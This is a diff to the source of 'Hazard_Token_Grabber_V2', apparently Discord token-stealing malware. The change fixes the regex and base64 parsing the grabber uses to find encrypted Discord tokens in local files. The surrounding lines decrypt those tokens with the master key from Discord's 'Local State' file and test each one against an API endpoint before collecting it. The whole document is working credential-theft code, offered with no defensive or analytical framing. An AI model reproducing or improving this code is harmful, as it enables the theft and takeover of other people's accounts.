@@ -23,7 +23,7 @@ class Hazard_Token_Grabber_V2:
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -292,7 +292,7 @@ class Hazard_Token_Grabber_V2:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
-                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                token = self.decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                 r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 if r.status_code == 200 and token not in self.tokens:
                                     self.tokens.append(token)
